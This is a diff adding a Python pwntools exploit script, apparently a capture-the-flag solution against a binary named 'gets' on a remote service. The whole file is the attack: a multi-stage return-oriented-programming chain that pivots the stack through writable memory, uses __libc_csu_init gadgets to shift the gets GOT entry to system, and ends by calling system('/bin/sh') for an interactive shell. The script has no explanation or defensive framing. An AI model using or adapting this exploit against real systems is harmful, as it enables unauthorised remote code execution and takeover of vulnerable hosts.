@@ -1,0 +1,189 @@
+from pwn import *
+# got  xinfo 0x601020
+p=process("./gets")
+p=remote("10.21.13.69",10010)
+elf=ELF("./gets")
+libc=elf.libc
+
+print "system:",hex(libc.symbols["system"])
+print "gets",hex(libc.symbols["gets"])
+
+
+offset=0xffffffff&(0x7ffff7a7bd80-0x7ffff7a52390)
+offset=0x100000000-offset+0x80
+
+
+gets=0x400410
+pop_rsp_r13_r14_r15_ret=0x4005ad
+pop_rbp_ret=0x400490
+pop_rdi_ret=0x4005b3
+pop_r15_ret=0x4005b2
+pop_rsi_r15_ret=0x4005b1
+pop_rbx_rbp_r12_r13_r14_r15_ret=0x4005aa 
+add_ebx_esi_ret=0x4004f9
+leave_ret =0x400544
+csu_init=0x400550
+call_at_r12=0x400599
+
+
+gets_got=0x601020
+
+buf1=0x601f00
+buf2=0x601e00
+buf3=0x601d00
+buf4=0x601c00
+buf5=0x601b00
+buf6=0x601a00
+buf7=0x601900
+buf8=0x601800
+
+
+rop1 = [
+	pop_rdi_ret, buf1,gets,   #rop2
+	pop_rdi_ret, buf2,gets,    #rop4
+	pop_rdi_ret, buf3,gets,   #rop5
+	pop_rdi_ret, buf4,gets,   #rop7
+	pop_rdi_ret, buf5,gets,   #rop9		#success
+	pop_rdi_ret, buf6,gets,   #rop10
+	pop_rdi_ret, buf7,gets,       
+	pop_rbp_ret, buf1-8, leave_ret,
+]
+
+
+#buf3=0x601d00
+
+rop2 =[ #buf1
+	pop_rdi_ret,gets_got+24,gets, #rop3
+	pop_rbp_ret,buf2-8,
+	pop_rsp_r13_r14_r15_ret, gets_got
+]
+
+rop3 =[ #gets_got+24
+	leave_ret
+]
+
+#csu_init=0x400550
+rop4=[ #buf2
+	csu_init,
+	pop_rbp_ret,buf3-8,leave_ret
+]
+
+
+
+#rop5 =[ #buf3
+#	pop_rdi_ret,buf2-24,gets, #rop6_1
+#	pop_rdi_ret,buf2+32,gets, #rop6_2
+#`	pop_rbp_ret, buf2-24-8, leave_ret,
+#]
+
+rop5=[ #buf3
+	pop_rdi_ret,buf2-24,gets,
+	pop_rdi_ret,buf2+32,gets,
+	pop_rbp_ret,buf2-24-8,leave_ret
+
+]
+
+
+rop6_1=[ #buf2-24
+	pop_rbx_rbp_r12_r13_r14_r15_ret,
+]
+
+
+#push on buf2
+rop6_2 =[#buf2 +32
+	pop_rsi_r15_ret,offset,0,
+	add_ebx_esi_ret,
+	csu_init,
+	pop_rbp_ret, buf4-8, leave_ret,
+]
+
+
+#buf4=0x601c00
+rop7 =[ #buf4
+	pop_rdi_ret, gets_got+28, gets, #rop8
+	pop_rbp_ret,buf5-8,
+	pop_rsp_r13_r14_r15_ret, gets_got+4,
+]
+
+rop8 =[# gets_got+28
+	leave_ret,
+]
+
+
+#buf5=0x601b00
+#csu_init=0x400550
+rop9 =[ #buf5    push r13 on buf5
+	csu_init,
+	pop_rbp_ret, buf6-8,leave_ret,
+]
+
+
+#buf6=0x601a00
+rop10 =[ #buf6
+	pop_rdi_ret, buf5-24, gets, #rop11_1
+	pop_rdi_ret, buf5+32, gets, #rop11_2
+	pop_rbp_ret, buf5-24-8, leave_ret
+]
+rop10=rop10
+
+
+#rop11_1=[ #buf5-24
+#	pop_rbx_rbp_r12_r13_r14_r15_ret,
+#]
+
+rop11_1='\xaa\x05\x40\x00\x00\x00'+'\n'
+
+
+rop11_2 = [ #buf5+32
+	pop_rdi_ret,buf2+68,gets, #rop12
+	pop_rbp_ret, buf2+68-8, leave_ret
+]
+
+
+#buf2=0x601e00
+rop12 =[ #buf2+164
+	csu_init,
+	pop_rbp_ret,buf7-8,leave_ret
+]
+ 
+
+rop13 = [ #buf7
+	pop_rdi_ret, 0x601e64,
+	pop_rbx_rbp_r12_r13_r14_r15_ret, 0,0,buf2+24,0,0,0,
+	call_at_r12
+]
+
+
+#gdb.attach(p,'''
+#b *0x4005b0
+#c
+#c
+#c
+#c
+#c
+#c
+#c
+#c
+#c
+
+#''')
+
+p.send('A'*24+
+	''.join(map(p64,rop1))+'\n'+
+	''.join(map(p64,rop2))+'\n'+
+	''.join(map(p64,rop4))+'\n'+
+	''.join(map(p64,rop5))+'\n'+
+	''.join(map(p64,rop7))+'\n'+
+	''.join(map(p64,rop9))+'\n'+      
+	''.join(map(p64,rop10))+'\n'+
+	''.join(map(p64,rop13))+'\n'+
+	''.join(map(p64,rop3))+'\n'+
+	''.join(map(p64,rop6_1))+'\n'+
+	''.join(map(p64,rop6_2))+'\n'+
+	''.join(map(p64,rop8))+'\n'+
+	rop11_1+
+	''.join(map(p64,rop11_2))+'\n'+
+	''.join(map(p64,rop12))+"/bin/sh\x00"+'\n'
+)
+
+p.interactive()
